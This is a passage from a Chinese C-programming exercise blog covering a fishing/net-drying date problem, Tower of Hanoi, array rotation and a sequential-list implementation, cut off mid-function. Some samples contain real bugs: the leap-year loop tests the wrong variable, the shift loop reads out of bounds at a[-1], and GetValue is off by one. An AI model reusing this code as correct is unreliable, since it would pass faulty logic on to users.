class="comment">问这个人在以后的某一天是“打鱼”还是“晒网”。*/</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> year,month,day;</span><br><span class="line">    <span class="keyword">int</span> y=<span class="number">2010</span>;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">13</span>]=&#123;<span class="number">0</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;<span class="comment">//建立一个有平年各月份天数的数组</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请按照年月日的顺序输入日期，中间用空格隔开\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span><span class="string">"%d"</span><span class="string">"%d"</span>,&amp;year,&amp;month,&amp;day);<span class="comment">//输入日期</span></span><br><span class="line">    <span class="keyword">while</span>((year&lt;<span class="number">2010</span>)||(month&lt;<span class="number">1</span>||month&gt;<span class="number">12</span>)||(month==<span class="number">2</span>&amp;&amp;(year%<span class="number">4</span>!=<span class="number">0</span>||year%<span class="number">400</span>!=<span class="number">0</span>)&amp;&amp;day&gt;=<span class="number">29</span>)||(day&gt;a[month]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"输入日期错误，请重新输入\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请按照年月日的顺序重新输入日期，中间用空格隔开\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span><span class="string">"%d"</span><span class="string">"%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断输入日期是否正确</span></span><br><span class="line">    <span class="keyword">for</span>(y;y&lt;year;y++)<span class="comment">//用此循环加上相差年份所隔的天数。 </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((year%<span class="number">400</span>==<span class="number">0</span>)||(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>))<span class="comment">//判断此年份是否是闰年 </span></span><br><span class="line">        &#123;</span><br><span class="line">            sum+=<span class="number">366</span>;</span><br><span class="line">        &#125;<span class="comment">//是闰年，则总天数加上366. </span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum+=<span class="number">365</span>;</span><br><span class="line">        &#125;<span class="comment">//是平年，总天数加上365 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">1</span>;m&lt;month;m++)<span class="comment">//用此循环加上所隔月份的总天数 </span></span><br><span class="line">    &#123;</span><br><span class="line">        sum+=a[m];</span><br><span class="line">        <span class="keyword">if</span>(month==<span class="number">2</span>&amp;&amp;((year%<span class="number">400</span>==<span class="number">0</span>)||(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>))) </span><br><span class="line">        &#123;</span><br><span class="line">            sum+=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="comment">//判断月份是否为闰年2月，若是2月，则总天数加一。</span></span><br><span class="line">    &#125;</span><br><span class="line">    sum+=day;<span class="comment">//总天数加上日 </span></span><br><span class="line">    <span class="keyword">if</span>((sum%<span class="number">5</span>==<span class="number">1</span>)||(sum%<span class="number">5</span>==<span class="number">2</span>)||(sum%<span class="number">5</span>==<span class="number">3</span>))<span class="comment">//用相隔总天数除以周期5，若余数为1,2,3，则此人打鱼。 </span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"这个人今天打鱼\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//否则，这个人晒网</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"这个人今天晒网\n"</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="38-汉诺塔问题"><a href="#38-汉诺塔问题" class="headerlink" title="38 汉诺塔问题"></a>38 汉诺塔问题</h2><p><strong>问题描述</strong></p><p><img src="/2020/01/26/C_C++_02/20200320150346.png" alt="image-20200320150341382"></p><p>&emsp;&emsp;需要移动的次数是2^n^-1</p><p><img src="/2020/01/26/C_C++_02/20200320151006.png" alt="image-20200320151003876">)<img src="/2020/01/26/C_C++_02/20200320151038.png" alt="image-20200320151036509"></p><p><strong>样例输入</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span> the <span class="keyword">number</span> of disk<span class="variable">s:3</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">the step:</span><br><span class="line">A-&gt;C</span><br><span class="line">A-&gt;B</span><br><span class="line">C-&gt;B</span><br><span class="line">A-&gt;C</span><br><span class="line">B-&gt;A</span><br><span class="line">B-&gt;C</span><br><span class="line">A-&gt;C</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><p><img src="/2020/01/26/C_C++_02/20200320151154.png" alt="image-20200320151153771"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hannuo</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">char</span> one,<span class="keyword">char</span> two,<span class="keyword">char</span> three)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input the number of disks:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the step:\n"</span>);</span><br><span class="line">    hannuo(num,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hannuo</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">char</span> one,<span class="keyword">char</span> two,<span class="keyword">char</span> three)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">move</span>(one,three);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        hannuo(num<span class="number">-1</span>,one,three,two);</span><br><span class="line">        <span class="built_in">move</span>(one,three);</span><br><span class="line">        hannuo(num<span class="number">-1</span>,two,one,three);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c-&gt;%c\n"</span>,a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="39-数组循环移位"><a href="#39-数组循环移位" class="headerlink" title="39 数组循环移位"></a>39 数组循环移位</h2><p><strong>题目描述</strong></p><p><img src="/2020/01/26/C_C++_02/20200325101715.png" alt="image-20200325101713838"></p><p><strong>样例输入</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">5 </span><span class="number">6</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><p>方法一：递归的方法</p><p><img src="/2020/01/26/C_C++_02/20200325103030.png" alt="image-20200325103028994"></p><p>方法二：直接移位，大问题化小问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ArrayRight</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[MAX],n,m;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ArrayRight(a,n,m);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ArrayRight</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp,k,i;</span><br><span class="line">    <span class="comment">//总共移动m位 </span></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)&#123;</span><br><span class="line">        temp=*(a+n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            *(a+i)=*(a+i<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *a=temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="40-线性表"><a href="#40-线性表" class="headerlink" title="40 线性表"></a>40 线性表</h2><p><strong>翔哥代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    适用于标准C</span></span><br><span class="line"><span class="comment">    SeqList.c</span></span><br><span class="line"><span class="comment">    V1.1</span></span><br><span class="line"><span class="comment">    2016.9.12 wangx</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OVERFLOW 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIST_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LISTINCREMENT 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Elemtype char</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//公共错误码，项目组成员之间的共同约定</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ERROR  -1  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTFIND  -2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PARAM_ERROR -3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REALLOC_ERROR  -4  </span></span><br><span class="line"><span class="comment">//顺序表的结构定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elemtype *pElem;    <span class="comment">//动态模式，只定义了一个指针，未分配数据的存储空间。本例假设每个元素都是char型，此处是实际应用中每个元素可能会是结构体变量或者结构体指针</span></span><br><span class="line">    <span class="keyword">int</span> iCount;         <span class="comment">//当前长度</span></span><br><span class="line">    <span class="keyword">int</span> iTotalLength;   <span class="comment">//线性表的总长度</span></span><br><span class="line">&#125;SeqList;               <span class="comment">//定义一个新类型，顺序表的类型名称</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//你这个菜鸟的任务，就是写这个InitList()函数。本函数假设实参指针已经指向了一个SeqList类型的结构体变量</span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">InitList</span><span class="params">(SeqList *pList)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     pList-&gt;iCount=<span class="number">0</span>; <span class="comment">//初始时，一个元素都没有</span></span><br><span class="line">     pList-&gt;iTotalLength= LIST_INIT_SIZE;  <span class="comment">//初始时理论总长就是100个元素（假定值）</span></span><br><span class="line">     pList-&gt;pElem= (Elemtype *)<span class="built_in">malloc</span>( LIST_INIT_SIZE * <span class="keyword">sizeof</span>(Elemtype));  <span class="comment">//因为SeqList的定义中，elem只是一个指针，需要分配空间并让该指针指向这段空间。因为malloc可能迸发异常，所以实际中往往会放在try &#123;&#125; catch() &#123;&#125;结构中</span></span><br><span class="line">     <span class="keyword">if</span> (pList-&gt;pElem==<span class="literal">NULL</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">return</span> MALLOC_ERROR;   <span class="comment">//  返回一个非0值（通常是一个负数），表示本子函数非正常结束，以供主调函数识别和采取对应措施</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;                           <span class="comment">//一般情况下，在实际工程开发中，基本上都默认函数返回值为0表示该函数运行期间没有异常情况</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据元素的值x，在顺序表pList中，查找其第一次出现的位置下标，并返回(注意，下标可以为0)。如果没找到，则返回NOTFIND，即-2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SearchByValue</span><span class="params">(SeqList *pList, Elemtype Value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//重要的步骤，参数校验！一定别忘了！如果Value有一定的现实含义，则还需要对其做参数有效性校验</span></span><br><span class="line">    <span class="keyword">if</span> (pList==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( pos&lt;=pList-&gt;iCount<span class="number">-1</span> &amp;&amp; pList-&gt;pElem[pos]!= Value) <span class="comment">//一边比较，一边往后移pos的值，直到找到或者到达有效数据的末尾</span></span><br><span class="line">        pos++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( pos &lt;= pList-&gt;iCount<span class="number">-1</span> ) <span class="comment">//如果是以“找到”的姿态跳出while循环</span></span><br><span class="line">        <span class="keyword">return</span> pos;</span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">return</span> NOTFIND;    <span class="comment">//如果是以“到末尾”的姿态跳出while循环</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//功能：根据给定的逻辑位置值pos（假设从1开始），在pList指向的顺序表中提取其元素值，存放到pValue指针指向的空间中并返回给主调函数使用</span></span><br><span class="line"><span class="comment">//备注：pValue的写法，展示了C语言如何通过参数传递，将子函数内的数据传出来，给主调函数使用，注意形参写法和调用时的实参写法！</span></span><br><span class="line"><span class="comment">//      pValue指针，假定其已经指向某个存储空间，本函数不再校验它。问题是：这个空间，应该在主调函数中申请，还是在子函数中申请？一般做法是在主调函数中申请！</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetValue</span><span class="params">(SeqList *pList, <span class="keyword">int</span> pos, Elemtype *pValue)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//重要的步骤，参数校验！一定别忘了！如果Value有一定的现实含义，则还需要对其做参数有效性校验</span></span><br><span class="line">    <span class="keyword">if</span> (pList==<span class="literal">NULL</span> || pList-&gt;pElem==<span class="literal">NULL</span> || pos&lt;<span class="number">1</span> || pos &gt;pList-&gt;iCount || pValue==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    *pValue= pList-&gt;pElem[pos];                    <span class="comment">//获得元素值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//功能：根据指定的逻辑位置pos值（假设从0开始），在pList指向的顺序表中，第pos个元素后面插入值为Value的元素</span></span><br><span class="line"><span class="comment">//备注：pos的值应&gt;=0，当pos=0时，全体所有数据都需要后移一格；当pos&gt;=iCount时，全体数据都不需要后移</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SeqListInsert</span><span class="params">(SeqList *pList, <span class="keyword">int</span> pos, Elemtype Value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Elemtype *pNewBase, *p, *q;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pList==<span class="literal">NULL</span> || pList-&gt;pElem==<span class="literal">NULL</span> || pos &lt;<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( pos &gt; pList-&gt;iCount )</span><br><span class="line">        pos = pList-&gt;iCount ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果当前已经装满，则需要扩展存储空间</span></span><br><span class="line">    <span class="keyword">if</span> (pList-&gt;iCount == pList-&gt;iTotalLength)</span><br><span class="line">    &#123;</span><br><span class="line">        pNewBase= (Elemtype *)<span class="built_in">realloc</span>(pList-&gt;pElem, (pList-&gt;iTotalLength + LISTINCREMENT)*<span class="keyword">sizeof</span>(Elemtype));  <span class="comment">//请同学们进一步了解realloc的工作原理，当空间字节数较多时，该函数开销较大！</span></span><br><span class="line">        <span class="keyword">if</span> (pNewBase== <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> REALLOC_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pList-&gt;pElem= pNewBase;</span><br><span class="line">        pList-&gt;iTotalLength= pList-&gt;iTotalLength + LISTINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q= &amp;(pList-&gt;pElem[pos]); <span class="comment">//q 指向的这个元素及其后面所有元素都需要后移一格</span></span><br><span class="line">    <span class="keyword">for</span>(p= &amp;(pList-&gt;pElem[pList-&gt;iCount<span class="number">-1</span>]) ; p&gt;=q; p--)  <span class="comment">//从后面往前，循环，每个元素后移一格，直到腾出要插入的内存空间。当pos=0时，全体所有数据都需要后移一格；当pos&gt;=iCount时，全体数据都不需要后移</span></span><br><span class="line">        *(p+<span class="number">1</span>)= *p;</span><br><span class="line"></span><br><span class="line">    *q= Value;  <span class="comment">//实现插入操作</span></span><br><span class="line">    pList-&gt;iCount++;  <span class="comment">//元素增加，别忘了让有效长度值iCount加1――随时维护iCount值的准确性，以方便程序员即时读取，而不是在需要的时候才去数个数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//合并无序的顺序表  MergeOption:0 不允许重复  1允许重复</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DisorderSeqListMerge</span><span class="params">(SeqList *pListA, SeqList *pListB, <span class="keyword">int</span> MergeOption, SeqList **pListC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pListA==<span class="literal">NULL</span> || pListA-&gt;pElem==<span class="literal">NULL</span> || pListB==<span class="literal">NULL</span> || pListB-&gt;pElem==<span class="literal">NULL</span> || MergeOption &lt; <span class="number">0</span> || MergeOption &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *pListC= (SeqList *)<span class="built_in">malloc</span>( <span class="keyword">sizeof</span>(SeqList));</span><br><span class="line">    <span class="keyword">if</span> (*pListC==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> MALLOC_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    (*pListC)-&gt;iTotalLength= pListA-&gt;iTotalLength + pListB-&gt;iTotalLength;</span><br><span class="line">    (*pListC)-&gt;pElem= (Elemtype *)<span class="built_in">malloc</span>( (*pListC)-&gt;iTotalLength * <span class="keyword">sizeof</span>(Elemtype));  </span><br><span class="line">    <span class="keyword">if</span> ((*pListC)-&gt;pElem==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*pListC) != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">free</span>(*pListC);</span><br><span class="line">        *pListC= <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> MALLOC_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将A表的数据依次复制到C表数据区</span></span><br><span class="line">    <span class="keyword">for</span>(i= <span class="number">0</span>; i&lt;pListA-&gt;iCount; i++)</span><br><span class="line">        (*pListC)-&gt;pElem[i]= pListA-&gt;pElem[i];</span><br><span class="line">    (*pListC)-&gt;iCount= pListA-&gt;iCount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;pListB-&gt;iCount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ret = SearchByValue(pListA, pListB-&gt;pElem[i]);</span><br><span class="line">        <span class="keyword">if</span> ( ret &gt;= <span class="number">0</span> &amp;&amp; MergeOption==<span class="number">0</span>) <span class="comment">//现有重复的元素,且不允许重复</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//什么都不做，不执行插入操作</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>  <span class="comment">//没找到，没有重复的元素</span></span><br><span class="line">        &#123;</span><br><span class="line">            